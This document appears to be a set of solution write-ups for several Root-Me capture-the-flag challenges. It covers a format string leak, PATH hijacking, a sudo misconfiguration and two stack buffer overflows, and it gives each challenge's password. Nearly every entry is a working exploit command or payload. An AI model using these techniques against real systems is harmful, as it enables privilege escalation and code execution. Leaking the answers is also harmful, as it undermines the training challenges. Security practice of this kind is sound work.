## [ELF x86 - Format string bug basic 1](https://www.root-me.org/en/Challenges/App-System/ELF-x86-Format-string-bug-basic-1)
<details>
  <summary>
    Solution
  </summary>
  <blockquote>
    %08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
    00000020.0804b008.b7e562f3.00000000.08049ff4.00000002.bffffbe4.bffffd0b.0000002f.0804b008.39617044.28293664.6d617045.00000a64.b7e564ad.b7fd03c4.b7fff000.08048579.b8789f00.08048570

    39617044
    28293664
    6d617045
    00000a64

    44706139 64362928 4570616d a6400000
  </blockquote>
</details>

<details>
  <summary>
    Password
  </summary>
  <p>
    Dpa9d6)(Epamd
  </p>
</details>


## [Bash - System 1](https://www.root-me.org/en/Challenges/App-Script/ELF32-System-1)
<details>
  <summary>
    Solution
  </summary>
  <blockquote>
    mkdir /tmp/bash1
    cp /bin/nano /tmp/bash1/ls
    export PATH=/tmp/bash1:$PATH
  </blockquote>
</details>

<details>
  <summary>
    Password
  </summary>
  <p>
    !oPe96a/.s8d5
  </p>
</details>

## [Bash - System 2](https://www.root-me.org/en/Challenges/App-Script/ELF32-System-2)
<details>
  <summary>
    Solution
  </summary>
  <blockquote>
    cp /bin/nano /tmp/bash1/ls
    export PATH=/tmp/bash1:$PATH
  </blockquote>
</details>


<details>
  <summary>
    Password
  </summary>
  <p>
    8a95eDS/*e_T#
  </p>
</details>

## [sudo - weak configuration](https://www.root-me.org/en/Challenges/App-Script/sudo-weak-configuration)
<details>
  <summary>
    Solution
  </summary>
  <blockquote>
    sudo -l
    sudo -u app-script-ch1-cracked  cat /challenge/app-script/ch1/ch1/../ch1cracked/.passwd
  </blockquote>
</details>


<details>
  <summary>
    Password
  </summary>
  <p>
    b3_c4r3full_w1th_sud0
  </p>
</details>




## [ELF x86 - Stack buffer overflow basic 1](https://www.root-me.org/en/Challenges/App-System/ELF32-Stack-buffer-overflow-basic-1)
<details>
  <summary>
    Solution
  </summary>
  <blockquote>
    (python -c 'print "\xef\xbe\xad\xde"*40 ' ;cat ) | ./ch13

    \xef\xbe\xad\xde

    ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?
  </blockquote>
</details>

<details>
  <summary>
    Password
  </summary>
  <p>
    1w4ntm0r3pr0np1s
  </p>
</details>

## [ELF x86 - Stack buffer overflow basic 2](https://www.root-me.org/en/Challenges/App-System/ELF32-Stack-buffer-overflow-basic-2)
<details>
  <summary>
    Solution
  </summary>
  <blockquote>
    objdump -d ch15

    08048464 <shell>:
    8048464:	55                   	push   %ebp
    8048465:	89 e5                	mov    %esp,%ebp
    8048467:	83 ec 18             	sub    $0x18,%esp
    804846a:	c7 04 24 a0 85 04 08 	movl   $0x80485a0,(%esp)
    8048471:	e8 0a ff ff ff       	call   8048380 <system@plt>
    8048476:	c9                   	leave  
    8048477:	c3                   	ret   

    08048464

    (python -c 'print "\x64\x84\x04\x08"*133 ';cat) |./ch15
  </blockquote>
</details>


<details>
  <summary>
    Password
  </summary>
  <p>
    B33r1sSoG0oD4y0urBr4iN
  </p>
</details>


